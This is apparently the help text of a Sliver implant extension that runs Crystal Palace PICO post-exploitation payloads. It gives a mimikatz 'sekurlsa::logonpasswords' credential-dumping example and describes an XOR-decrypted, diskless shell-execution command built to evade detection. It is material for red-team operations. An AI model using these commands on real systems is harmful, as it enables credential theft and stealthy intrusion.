commands.help: Run a Crystal Palace PICO-wrapped post-ex DLL inside a Sliver implant
commands.long_help:
Loads and executes a Crystal Palace PICO binary from a path on the target.

Args format: payload=<path>[|<runtime_args>]
  Use forward slashes only — Sliver's arg parser eats backslashes.

Examples:
  crystal payload=C:/tmp/mimikatz.pico.bin
  crystal payload=C:/tmp/mimikatz.pico.bin|sekurlsa::logonpasswords exit

commands.help: Run a shell command on the target through Crystal Palace evasion
commands.long_help: Executes a shell command via an embedded Crystal Palace PICO (no file staging required). The PICO is baked into the extension DLL at build time and XOR-decrypted at runtime. Output is returned to the operator via anonymous pipe — no disk artifact.

arguments.name: cmd
arguments.desc: Shell command to execute, e.g. whoami /all
